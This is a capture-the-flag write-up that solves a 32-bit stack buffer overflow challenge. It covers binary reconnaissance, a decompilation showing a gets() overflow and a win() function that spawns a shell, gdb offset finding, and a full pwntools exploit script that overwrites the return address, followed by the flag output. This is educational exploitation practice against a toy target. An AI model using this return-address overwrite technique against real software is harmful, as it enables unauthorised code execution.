# &#35; chall_10


#### &#42; purpose
1. find offset to input variable(local_48[56]) and *local_10
2. find leaked main() address


#### &#42; execute
```bash
## 1 file
$ ls ./chall_10
./chall_10

## 32-bit LSB, dynamically linked and not stripped
$ file ./chall_10
./chall_10: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a6e31925db243cfd838d9aff38f7a8b00ad425db, for GNU/Linux 3.2.0, not stripped

## Partial RELRO
$ checksec --file=./chall_10
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   73) Symbols	  No	0		2		./chall_10

## just input twice
./chall_10
Don't waste your time, or...
AAAA
BBBB
$

```

#### &#42; decompile using ghidra
```bash
## vulnerable point is gets(local_3e);
## win() has one argument(0xdeadbeef)
## need to give this value when call win()


void main(void)

{
  char local_24 [20];
  undefined *local_10;
  
  local_10 = &stack0x00000004;
  puts("Don\'t waste your time, or...");
  fgets(local_24,0x13,stdin);
  vuln();
  return;
}

void vuln(void)

{
  char local_3e [54];
  
  gets(local_3e);
  return;
}

void win(int param_1)

{
  if (param_1 == L'\xdeadbeef') {
    system("/bin/sh");
  }
  return;
}




## exploit structure
local_3e [54] + sfp[4] + ret[win()] + ret of win() + 0xdeadbeef

```


#### &#42; exploit step
```bash
1. overwrite ret to win()
2. at the same time, give argument(0xdeadbeef)

```



#### &#42; analysis binary using gdb
```bash
## check to execute using CCCC
## find offset is buf[62] + "CCCC"
gef➤  c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x43434343 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xfff5999e  →  "BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB[...]"
$ebx   : 0x42424242 ("BBBB"?)
$ecx   : 0xf7fa0580  →  0xfbad2288
$edx   : 0xfff599e0  →  0xf7fa0300  →  0xf7f46d3d  →  "ISO-10646/UTF8/"
$esp   : 0xfff599e0  →  0xf7fa0300  →  0xf7f46d3d  →  "ISO-10646/UTF8/"
$ebp   : 0x42424242 ("BBBB"?)
$esi   : 0xf7fa0000  →  0x001ead6c
$edi   : 0xf7fa0000  →  0x001ead6c
$eip   : 0x43434343 ("CCCC"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xfff599e0│+0x0000: 0xf7fa0300  →  0xf7f46d3d  →  "ISO-10646/UTF8/"	 ← $esp
0xfff599e4│+0x0004: 0x00040000
0xfff599e8│+0x0008: 0x00000000
0xfff599ec│+0x000c: "AAAA\n"
0xfff599f0│+0x0010: 0x0000000a
0xfff599f4│+0x0014: 0xfff59ab4  →  0xfff5b878  →  "/pwn/sunshine/10/chall_10"
0xfff599f8│+0x0018: 0xfff59abc  →  0xfff5b892  →  "SHELL=/bin/bash"
0xfff599fc│+0x001c: 0x080492e1  →  <__libc_csu_init+33> lea ebx, [ebp-0xf4]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x43434343
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall_10", stopped 0x43434343 in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤



```

#### &#42; structure of stack
```bash
local_3e [54] + dummy[4] + sftp[4] + ret[4]



```

#### &#42; payload(python)
```python
payload  = b""
payload += b"A"*62
payload += p32(win)
payload += b"DUMY"
payload += p32(0xdeadbeef)


```


#### &#42; make exploit code
```python
$ cat exp.py
from pwn import *

filename = "chall_10"
conn = process(filename)
elf = ELF(filename)

win = elf.symbols["win"]

payload  = b""
payload += b"A"*62
payload += p32(win)
payload += b"DUMY"
payload += p32(0xdeadbeef)

print( conn.recvuntil("or...\n") )

conn.sendline("AAAA")
conn.sendline(payload)

conn.interactive()

```


#### &#42; try to exploit
```bash
$ python2 exp.py
[!] Could not find executable 'chall_10' in $PATH, using './chall_10' instead
[+] Starting local process './chall_10': pid 255
[*] '/pwn/sunshine/10/chall_10'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
Don't waste your time, or...

[*] Switching to interactive mode
$
$ cat flag.txt
sun{second-heartbeat-aeaff82332769d0f}
$

```
